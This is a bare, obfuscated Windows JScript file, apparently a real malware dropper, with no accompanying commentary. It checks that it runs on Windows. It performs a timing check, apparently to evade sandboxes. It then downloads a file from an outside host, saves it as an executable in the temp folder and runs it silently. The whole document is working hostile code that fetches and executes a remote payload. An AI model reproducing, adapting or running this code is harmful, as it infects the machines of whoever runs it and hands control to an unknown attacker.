var l0 = false;
var U = "CreateObject";
var ps = function F() {return WScript[U]("WScript.Shell");}(), Et = 11;
var hm = "MSXML2.XMLHTTP";
var zu = 2123213;
var Bg = 0;
function I(H){ps["Run"](H, Bg, Bg);};
function yC(){return "" + hm;};
function z(k, Rk){Bg = Bg * 1; return k - Rk;};
function Dl(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    l0 = true;
  @end
@*/
if (l0)
{
var v = "";
function d(){return 22;};
var Z = 0; var J = 0;
function G()
{
var s0 = new this["Date"]();
var s = s0["getUTCMilliseconds"]();
WScript["Sleep"](d());
var s0 = new this["Date"]();
var Id = s0["getUTCMilliseconds"]();
WScript["Sleep"](d());
var s0 = new this["Date"]();
var b = s0["getUTCMilliseconds"]();
var Z = "wO";
Z = z(Id, s);
var J = "V";
J = z(b, Id);
v = "open";
return z(Z, J);
}
var nx = false;
var Y = false;
for (var gh = Bg; gh < d() * 1; gh++){if (G() != Bg){
nx = true; 
J = "31" + 11 * Z + J; 
Y = true; 
break;
}}
function l() {return ((nx == true) && (nx == Y)) ? 1 : Bg;};
if (nx && l() && Y){
function P() {return ps["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "P832OusH4rwd.exe";};
 U0 = yC();
 or = WScript[U](U0);
 var fR = 1;
 while (fR){
try {
or[v]("GET", "http://pasticceriabonci.it/m1psa", false);
or["send"]();
Bs = "Sleep";
for (;;){WScript[Bs](d() * 11); if (or["readystate"] >= 2 * 2) break;};
fR = Bg;
} catch(KD){};
}
function xz(a) {var S = (1, 2, 3, 4, 5, a); return S;};
FJ = WScript[Dl()]("ADODB.Stream");
U0 = FJ;
U0[v]();
U0["type"] = xz(1);
U0["write"](or["ResponseBody"]);
FJ["position"] = xz(Bg);
U0["Save" + "ToFile"](P(), 2);
FJ["c"+"lose"]();
uQ = P();
I(uQ);
}
}

